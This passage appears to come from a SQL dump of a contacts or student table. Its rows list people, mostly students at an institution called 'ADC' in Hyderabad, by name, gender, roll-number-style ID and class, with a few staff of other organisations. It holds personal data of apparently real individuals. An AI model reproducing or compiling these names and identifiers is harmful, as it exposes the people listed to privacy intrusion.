(253, '2', 'Suresh', 'T', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Suresh T', '', 'Vishnu Sree Institute of Technology and Engineering', '', '', 0),
(254, '2', 'Sirisha', 'V', '0000-00-00', 'F', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sirisha V', '', 'St.Pious Degree College', '', '', 0),
(255, '2', 'Dinesh', '', '0000-00-00', 'M', '', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Dinesh ', '', '', '', '', 0),
(256, '2', 'Kavya', 'Reddy', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Kavya Reddy', NULL, 'St.Pious Degree College', NULL, NULL, 0),
(257, '2', 'Kollu Sobah ', 'Recah', '0000-00-00', 'F', '1051-11-467-071', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Kollu Sobah  Recah', '', 'ADC', '', 'MSCs-2B', 0),
(258, '2', 'Vishalini', 'J ', '0000-00-00', 'F', '1051-11-467-042', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Vishalini J ', '', 'ADC', '', 'MSCs-2B', 0),
(259, '2', 'Vidhya', 'Chakragari', '0000-00-00', 'F', '1051-11-467-086', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Vidhya Chakragari', '', 'ADC', '', 'MSCs-2B', 0),
(260, '2', 'Prasanna', '', '0000-00-00', 'F', '1051-11-467-073', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Prasanna ', '', 'ADC', '', 'MSCs-2B', 0),
(261, '2', 'Smitha ', 'Rupani', '0000-00-00', 'F', '1051-11-402-109', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Smitha  Rupani', '', 'ADC', '', 'B.com-2B', 0),
(262, '2', 'Vinayak', 'G', '0000-00-00', 'M', '1051-11-467-007', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vinayak G', '', 'ADC', '', 'MSCs-2A', 0),
(263, '2', 'Lavina ', 'Hassija', '0000-00-00', 'F', '1051-11-467-014', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Lavina  Hassija', '', 'ADC', '', 'MSCs-2A', 0),
(264, '2', 'Sanjana ', '', '0000-00-00', 'F', '1051-11-488-020', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sanjana  ', '', 'ADC', '', 'Life sciences', 0),
(265, '2', 'Neha ', 'Asawa', '0000-00-00', 'F', '1051-11-459-006', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Neha  Asawa', '', 'ADC', '', 'Life sciences', 0),
(266, '2', 'Ashritha', 'Annadatha', '0000-00-00', 'F', '1051-11-459-009', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Ashritha Annadatha', '', 'ADC', '', 'Life sciences', 0),
(267, '2', 'Ananya', 'Malladi', '0000-00-00', 'F', '1051-11-459-032', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Ananya Malladi', '', 'ADC', '', 'Life sciences', 0),
(268, '2', 'Sai Ramya', '', '0000-00-00', 'F', '1051-11-459-014', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sai Ramya ', '', 'ADC', '', 'Life sciences', 0),
(269, '2', 'Rekha', 'P', '0000-00-00', 'F', '1051-11-467-005', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rekha P', '', 'ADC', '', 'MSCs-2', 0),
(270, '2', 'Vasavi', 'K', '0000-00-00', 'F', '1051-11-467-025', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Vasavi K', '', 'ADC', '', 'MSCs-2', 0),
(271, '2', 'Shiva Kumar', 'Ch', '0000-00-00', 'M', '1051-11-467-024', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Shiva Kumar Ch', '', 'ADC', '', 'MSCs-2', 0),
(272, '2', 'Kavya', 'B', '0000-00-00', 'F', '1051-11-467-003', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Kavya B', '', 'ADC', '', 'MSCs-2', 0),
(273, '2', 'Laxmi Narashima Raju', 'P', '0000-00-00', 'M', '1051-11-468-018', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Laxmi Narashima Raju P', '', 'ADC', '', 'MPCs-2', 0),
(274, '2', 'Deepthi Sai', 'Khasi Bhatla ', '0000-00-00', 'F', '1051-11-467-033', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Deepthi Sai Khasi Bhatla ', '', 'ADC', '', 'MSCs-2A', 0),
(275, '2', 'Keerthi', 'R', '0000-00-00', 'F', '1051-11-467-023', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Keerthi R', '', 'ADC', '', 'MSCs-2A', 0),
(276, '2', 'Sushma', 'R', '0000-00-00', 'F', '1051-11-467-022', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sushma R', '', 'ADC', '', 'MSCs-2A', 0),
(277, '2', 'Vivek', 'V', '0000-00-00', 'M', '1051-11-467-018', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vivek V', '', 'ADC', '', 'MSCs-2A', 0),
(278, '2', 'Harish Reddy', 'K', '0000-00-00', 'M', '1051-11-467-010', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Harish Reddy K', '', 'ADC', '', 'MSCs-2A', 0),
(279, '2', 'Sai Kiran Reddy', 'K', '0000-00-00', 'M', '1051-11-467-001', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sai Kiran Reddy K', '', 'ADC', '', 'MSCs-2A', 0),
(280, '2', 'Rohit Reddy', 'K', '0000-00-00', 'M', '1051-11-474-079', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Rohit Reddy K', '', 'ADC', '', 'MECs-2B', 0),
(281, '2', 'Keerthi Shree', 'K', '0000-00-00', 'F', '1051-11-474-020', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Keerthi Shree K', '', 'ADC', '', 'MECs-2A', 0),
(282, '2', 'Guru Prasad', 'Putta', '0000-00-00', 'M', '1051-11-474-111', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Guru Prasad Putta', '', 'ADC', '', 'MECs-2B', 0),
(283, '2', 'Prashanth ', 'Kumar', '0000-00-00', 'M', '1051-11-474-071', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Prashanth  Kumar', '', 'ADC', '', 'MECs-2B', 0),
(284, '2', 'Narayana Reddy', 'A', '0000-00-00', 'M', '1051-11-468-040', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Narayana Reddy A', '', 'ADC', '', 'MPCs-2', 0),
(285, '2', 'Dewas', 'Agarwal', '0000-00-00', 'M', '1051-11-407-005', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Dewas Agarwal', '', 'ADC', '', 'B.com(Hon)-2', 0),
(286, '2', 'Raja Singhal', 'Param', '0000-00-00', 'M', '1051-11-407-009', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Raja Singhal Param', '', 'ADC', '', 'B.com(Hon)-2', 0),
(287, '2', 'Abdul', 'Mujeeb', '0000-00-00', 'M', '1051-11-407-014', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Abdul Mujeeb', '', 'ADC', '', 'B.com(Hon)-2', 0),
(288, '2', 'Hareesha', 'Reddy', '0000-00-00', 'F', '1051-11-407-019', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Hareesha Reddy', '', 'ADC', '', 'B.com(Hon)-2', 0),
(289, '2', 'Rozmeen', '', '0000-00-00', 'F', '1051-11-407-042', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rozmeen ', '', 'ADC', '', 'B.com(Hon)-2', 0),
(290, '2', 'Syed Abbas', 'Jawad', '0000-00-00', 'M', '1051-11-407-045', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Syed Abbas Jawad', '', 'ADC', '', 'B.com(Hon)-2', 0),
(291, '2', 'Komal Kumari ', 'Bhati', '0000-00-00', 'F', '1051-11-407-064', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Komal Kumari  Bhati', '', 'ADC', '', 'B.com(Hon)-2', 0),
(292, '2', 'Rashmi', '', '0000-00-00', 'F', '1051-11-407-065', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rashmi ', '', 'ADC', '', 'B.com(Hon)-2', 0),
(293, '2', 'Arun', 'Krishnamurthy', NULL, 'M', NULL, 'Delhi', 'Delhi', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Arun Krishnamurthy', NULL, NULL, NULL, NULL, 0),
(294, '2', 'Swarna Latha', NULL, NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Swarna Latha', NULL, 'Gandhi Hospital', NULL, NULL, 0),
(295, '1', 'Deepak', 'Sahu', NULL, 'M', NULL, 'Indore', 'Madhya Pradesh', NULL, NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'IGS Office', NULL, NULL, NULL, NULL, 0),
(296, '2', 'Sanjib', '', '0000-00-00', 'M', '', 'Delhi', 'Delhi', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sanjib', '', 'Basix', '', '', 0),
(297, '2', 'Venkat', 'D', '0000-00-00', 'M', '', 'Delhi', 'Delhi', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Venkat', '', 'Basix', '', '', 0),
(298, '2', 'Tarung ', 'Kapoor', '0000-00-00', 'M', '', 'Delhi', 'Delhi', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Tarung ', '', '', '', '', 0),
(299, '2', 'Nitin', 'Chopra', '0000-00-00', 'M', '', 'Delhi', 'Delhi', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Nitin', '', '', '', '', 0),
(300, '2', 'Aanchal', ' Bahadur', '0000-00-00', 'F', '', 'Delhi', 'Delhi', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Aanchal', '', 'Google', '', '', 0),
(301, '2', 'Mohita', ' Mathur', '0000-00-00', 'F', '', 'Delhi', 'Delhi', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Mohita', '', 'Google', '', '', 0),
(302, '2', 'Priyank', 'Arora', NULL, 'M', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Priyank Arora', NULL, 'ISB', NULL, NULL, 0),
(303, '2', 'Ridhi', 'Gupta', NULL, 'F', NULL, 'Hyderabad', 'Andhra Pradesh', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Ms. Ridhi Gupta', NULL, 'ISB', NULL, NULL, 0),
(304, '2', 'Paramjeet', 'Singh', NULL, 'M', NULL, 'Hyderabad', NULL, 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Paramjeet Singh', NULL, NULL, NULL, NULL, 0),
(305, '2', 'Lohitha', '', '0000-00-00', 'F', '1051-11-407-021', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Lohitha ', '', 'ADC', '', 'B.com(Hon)-2', 0),
(306, '2', 'Patel Avinash', 'J', '0000-00-00', 'M', '1051-11-407-031', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Patel Avinash J', '', 'ADC', '', 'B.com(Hon)-2', 0),
(307, '2', 'Deepesh', '', '0000-00-00', 'M', '1051-11-407-067', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Deepesh ', '', 'ADC', '', 'B.com(Hon)-2', 0),
(308, '2', 'Mitush', 'Bansal', '0000-00-00', 'M', '1051-11-407-018', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Mitush Bansal', '', 'ADC', '', 'B.com(Hon)-2', 0),
(309, '2', 'Teja', 'M', '0000-00-00', 'M', '1051-11-407-012', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Teja M', '', 'ADC', '', 'B.com(Hon)-2', 0),
(310, '2', 'Rutvick  Parlikar', 'M', '0000-00-00', 'M', '1051-11-467-052', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Rutvick  Parlikar M', '', 'ADC', '', 'MSCs-2B', 0),
(311, '2', 'Srinath', 'Purkait', '0000-00-00', 'M', '1051-11-467-094', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Srinath Purkait', '', 'ADC', '', 'MSCs-2B', 0),
(312, '2', 'Anshuman ', 'Chaturvedi', '0000-00-00', 'M', '1051-11-467-090', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Anshuman  Chaturvedi', '', 'ADC', '', 'MSCs-2B', 0),
(313, '2', 'Sharma Anand ', 'Kumar', '0000-00-00', 'M', '1051-11-467-066', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sharma Anand  Kumar', '', 'ADC', '', 'MSCs-2B', 0),
(314, '2', 'Tejasvi', 'Kalanakuntla', '0000-00-00', 'F', '1051-11-467-027', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Tejasvi Kalanakuntla', '', 'ADC', '', 'MSCs-2A', 0),
(315, '2', 'Nitya Reddy', 'Vallapureddy', '0000-00-00', 'F', '1051-11-467-047', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Nitya Reddy Vallapureddy', '', 'ADC', '', 'MSCs-2A', 0),
(316, '2', 'Jyothi', 'Y', '0000-00-00', 'F', '1051-11-402-013', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Jyothi Y', '', 'ADC', '', 'B.com(comp)', 0),
(317, '2', 'Vamshi Ganesh', 'B', '0000-00-00', 'M', '1051-11-402-041', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vamshi Ganesh B', '', 'ADC', '', 'B.com(comp)', 0),
(318, '2', 'Kameswari Kalyani', 'Gopalabhatla', '0000-00-00', 'F', '1051-11-467-045', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Kameswari Kalyani Gopalabhatla', '', 'ADC', '', 'MSCs-2B', 0),
(319, '1', 'Mukesh', 'Yadav', '0000-00-00', 'M', '1051-11-467-029', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Mukesh Yadav', '', 'ADC', '', 'MSCs-2B', 0),
(320, '2', 'Arjun', 'Arunarthi', '0000-00-00', 'M', '1051-11-467-077', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Arjun Arunarthi', '', 'ADC', '', 'MSCs-2B', 0),
(321, '2', 'Prerna ', 'Shah', '0000-00-00', 'F', '1051-11-401-240', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Prerna  Shah', '', 'ADC', '', 'B.com(comp)', 0),
(322, '2', 'pooja', 'Patel', '0000-00-00', 'F', '1051-11-401-255', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. pooja Patel', '', 'ADC', '', 'B.com(comp)', 0),
(323, '2', 'Rachana', 'Jain', '0000-00-00', 'F', '1051-11-401-243', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rachana Jain', '', 'ADC', '', 'B.com(comp)', 0),
(324, '2', 'Pratika ', 'Saraf', '0000-00-00', 'F', '1051-11-401-263', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Pratika  Saraf', '', 'ADC', '', 'B.com(comp)', 0),
(325, '2', 'Rajini ', 'Patel', '0000-00-00', 'F', '1051-11-401-247', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Rajini  Patel', '', 'ADC', '', 'B.com(comp)', 0),
(326, '2', 'Lokesh', 'Jain', '0000-00-00', 'M', '1051-11-401-271', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Lokesh Jain', '', 'ADC', '', 'B.com(comp)', 0),
(327, '2', 'Aakash', 'Jain', '0000-00-00', 'M', '1051-11-401-228', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Aakash Jain', '', 'ADC', '', 'B.com(comp)', 0),
(328, '2', 'Naresh ', 'Choudary', '0000-00-00', 'M', '1051-11-401-235', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Naresh  Choudary', '', 'ADC', '', 'B.com(comp)', 0),
(329, '2', 'Dwarak', 'Nath', '0000-00-00', 'M', '1051-11-401-227', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Dwarak Nath', '', 'ADC', '', 'B.Com(Reg-2)', 0),
(330, '2', 'Kaunal ', 'lidhoriya', '0000-00-00', 'M', '1051-11-401-236', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Kaunal  lidhoriya', '', 'ADC', '', 'B.Com(Reg-2)', 0),
(331, '2', 'Srinivasula', 'Reddy', '0000-00-00', 'M', '1051-11-474-053', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Srinivasula Reddy', '', 'ADC', '', 'MECs-2A', 0),
(332, '2', 'Suresh', '', '0000-00-00', 'M', '1051-11-474-055', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Suresh ', '', 'ADC', '', 'MECs-2A', 0),
(333, '2', 'Venkata', 'Avinash', '0000-00-00', 'M', '1051-11-474-049', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Venkata Avinash', '', 'ADC', '', 'MECs-2A', 0),
(334, '2', 'Nithesh', '', '0000-00-00', 'M', '1051-11-474-045', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Nithesh ', '', 'ADC', '', 'MECs-2A', 0),
(335, '2', 'Satya Sai Prasad', 'Mangalaparthi', '0000-00-00', 'M', '1051-11-467-026', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Satya Sai Prasad Mangalaparthi', '', 'ADC', '', 'MSCs-2A', 0),
(336, '2', 'Anjana', 'singh', '0000-00-00', 'F', '1051-11-474-061', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Anjana singh', '', 'ADC', '', 'MECs-2B', 0),
(337, '2', 'Sanjay', '', '0000-00-00', 'M', '1051-11-401-060', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sanjay ', '', 'ADC', '', 'B.com2(Reg)', 0),
(338, '2', 'Avinash', 'K', '0000-00-00', 'M', '1051-11-401-021', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Avinash K', '', 'ADC', '', 'B.com2(Reg)', 0),
(339, '2', 'Srinivas', '', '0000-00-00', 'M', '1051-11-401-032', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Srinivas ', '', 'ADC', '', 'B.com2(Reg)', 0),
(340, '2', 'kalyan', '', '0000-00-00', 'M', '1051-11-401-057', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. kalyan ', '', 'ADC', '', 'B.com2(Reg)', 0),
(341, '2', 'Akash', '', '0000-00-00', 'M', '1051-11-401-011', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Akash ', '', 'ADC', '', 'B.com2(Reg)', 0),
(342, '2', 'Akshay', 'N', '0000-00-00', 'M', '1051-11-401-015', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Akshay N', '', 'ADC', '', 'B.com2(Reg)', 0),
(343, '2', 'Avinash', 'G', '0000-00-00', 'M', '1051-11-401-017', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Avinash G', '', 'ADC', '', 'B.com2(Reg)', 0),
(344, '2', 'Ramesh', '', '0000-00-00', 'M', '1051-11-401-018', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Ramesh ', '', 'ADC', '', 'B.com2(Reg)', 0),
(345, '2', 'Vishal', 'Jain', '0000-00-00', 'M', '1051-11-401-001', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vishal Jain', '', 'ADC', '', 'B.com2(Reg)', 0),
(346, '2', 'Vimal', 'Jain', '0000-00-00', 'M', '1051-11-401-007', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vimal Jain', '', 'ADC', '', 'B.com2(Reg)', 0),
(347, '2', 'Joshi', 'Kumar', '0000-00-00', 'M', '1051-11-407-062', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Joshi Kumar', '', 'ADC', '', 'B.com(Hon)-2', 0),
(348, '2', 'Raghu ', 'Ram', '0000-00-00', 'M', '1051-11-407-047', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Raghu  Ram', '', 'ADC', '', 'B.com(Hon)-2', 0),
(378, '2', 'Vidyasagar', 'A', NULL, 'M', NULL, 'Chennai', 'Tamil Nadu', 'India', NULL, '', NULL, '', '', '', '', NULL, NULL, NULL, 'Mr. Vidyasagar A', NULL, NULL, NULL, NULL, 0),
(350, '2', 'Sairam', '', '0000-00-00', 'M', '1051-11-407-052', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sairam ', '', 'ADC', '', 'B.com(Hon)-2', 0),
(351, '2', 'Shiva', 'Kumar', '0000-00-00', 'M', '1051-11-407-033', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Shiva Kumar', '', 'ADC', '', 'B.com(Hon)-2', 0),
(352, '2', 'Mounika', '', '0000-00-00', 'F', '1051-11-401-070', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Mounika ', '', 'ADC', '', 'B.com2(Reg)', 0),
(353, '2', 'Ramya', '', '0000-00-00', 'F', '1051-11-401-020', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Ramya ', '', 'ADC', '', 'B.com2(Reg)', 0),
(354, '2', 'Navya', 'B', '0000-00-00', 'F', '1051-11-401-045', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Navya B', '', 'ADC', '', 'B.com2(Reg)', 0),
(355, '2', 'Navya', 'Sree', '0000-00-00', 'F', '1051-11-401-035', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Navya Sree', '', 'ADC', '', 'B.com2(Reg)', 0),
(356, '2', 'Sushmitha', '', '0000-00-00', 'F', '1051-11-401-134', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sushmitha ', '', 'ADC', '', 'B.com2(Reg)', 0),
(357, '2', 'Tina', 'Reddy', '0000-00-00', 'F', '1051-11-401-067', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Tina Reddy', '', 'ADC', '', 'B.com2(Reg)', 0),
(358, '2', 'Zeba', '', '0000-00-00', 'F', '1051-11-488-013', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Zeba ', '', 'ADC', '', 'Life sciencs-2', 0),
(359, '2', 'Saleha', '', '0000-00-00', 'F', '1051-11-488-001', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Saleha ', '', 'ADC', '', 'Life sciencs-2', 0),
(360, '2', 'John', '', '0000-00-00', 'M', '1051-11-407-050', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. John ', '', 'ADC', '', 'B.com(Hon)-2', 0),
(361, '2', 'Sagar', 'Morwal', '0000-00-00', 'M', '1051-11-474-114', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sagar Morwal', '', 'ADC', '', 'MECs-2B', 0),
(362, '2', 'Sandeep', '', '0000-00-00', 'M', '1051-11-474-070', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Sandeep ', '', 'ADC', '', 'MECs-2B', 0),
(363, '2', 'Vamshi Kiran Yadav', 'A ', '0000-00-00', 'M', '1051-11-474-081', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Vamshi Kiran Yadav A ', '', 'ADC', '', 'MECs-2B', 0),
(364, '2', ' Shiva Tandav', '', '0000-00-00', 'M', '1051-11-459-003', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr.  Shiva Tandav ', '', 'ADC', '', 'Life sciencs-2', 0),
(365, '2', 'Madhuri', '', '0000-00-00', 'F', '1051-11-459-022', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Madhuri ', '', 'ADC', '', 'Life sciencs-2', 0),
(366, '2', 'Anand Raj', '', '0000-00-00', 'M', '1051-11-459-035', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Anand Raj ', '', 'ADC', '', 'Life sciencs-2', 0),
(367, '2', 'Rahul', '', '0000-00-00', 'M', '1051-11-459-004', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Rahul ', '', 'ADC', '', 'Life sciencs-2', 0),
(368, '2', 'Joseph', '', '0000-00-00', 'M', '1051-11-467-062', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Joseph ', '', 'ADC', '', 'MSCs-2B', 0),
(369, '2', 'Sowmya', '', '0000-00-00', 'F', '1051-11-467-051', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Sowmya ', '', 'ADC', '', 'MSCs-2B', 0),
(370, '2', 'Shyam', 'Sunder', '0000-00-00', 'M', '1051-11-474-062', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Mr. Shyam Sunder', '', 'ADC', '', 'MECs-2B', 0),
(371, '3', 'Urmilla', '', '0000-00-00', 'F', '1051-11-467-004', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Urmilla ', '', 'ADC', '', 'MSCs-2A', 0),
(372, '2', 'Deeksha', '', '0000-00-00', 'F', '1051-11-474-003', 'Hyderabad', 'Andhra Pradesh', 'India', '0', '', '', '', '', '', '', '', '', '', 'Ms. Deeksha ', '', 'ADC', '', 'MECs-2A', 0),
